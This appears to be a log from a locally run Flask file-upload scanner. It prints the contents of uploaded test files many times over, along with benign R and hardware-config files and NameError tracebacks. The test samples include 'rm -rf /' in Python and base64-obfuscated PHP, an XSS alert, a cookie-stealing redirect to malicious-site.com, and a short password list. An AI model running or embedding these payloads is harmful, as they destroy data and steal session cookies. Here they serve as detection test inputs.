2025-02-22 20:39:04,295 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:39:04,301 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,302 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,303 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,304 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,305 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,306 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,307 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,309 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:39:04,310 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,311 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:39:04,312 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,314 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,315 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,316 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,317 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,318 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,319 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:39:04,320 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,322 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:39:04,323 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,325 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,326 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,328 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,329 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,331 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,332 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:39:04,335 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,336 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:39:04,338 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,340 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,342 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,343 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,345 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,346 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,348 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:39:04,350 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,351 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:39:04,353 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,355 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,356 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,358 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,359 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,361 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,362 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:39:04,364 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,365 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:39:04,367 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,372 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:39:04,372 - [33mPress CTRL+C to quit[0m
2025-02-22 20:39:09,632 - 127.0.0.1 - - [22/Feb/2025 20:39:09] "GET / HTTP/1.1" 200 -
2025-02-22 20:39:14,597 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 274, in upload_file
    filename = secure_filename(file.filename)
NameError: name 'secure_filename' is not defined
2025-02-22 20:39:14,599 - 127.0.0.1 - - [22/Feb/2025 20:39:14] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 20:39:25,436 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 274, in upload_file
    filename = secure_filename(file.filename)
NameError: name 'secure_filename' is not defined
2025-02-22 20:39:25,437 - 127.0.0.1 - - [22/Feb/2025 20:39:25] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 20:41:00,850 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:41:00,855 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:41:00,856 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:41:00,858 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:41:00,860 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:00,861 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:00,862 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:00,864 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:00,865 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:00,866 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:41:00,871 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:00,872 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:00,873 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:41:00,876 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:41:00,877 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:41:00,880 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:41:00,881 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:00,882 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:00,883 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:00,884 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:00,885 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:00,887 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:41:00,892 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:00,893 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:00,894 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:41:00,897 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:41:00,898 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:41:00,900 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:41:00,902 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:00,903 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:00,904 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:00,905 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:00,906 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:00,907 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:41:00,912 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:00,913 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:00,914 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:00,915 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:00,917 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:00,918 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:00,919 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:00,920 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:41:00,921 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:00,923 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:41:00,924 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:00,926 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:00,927 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:00,928 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:00,929 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:00,930 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:00,931 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
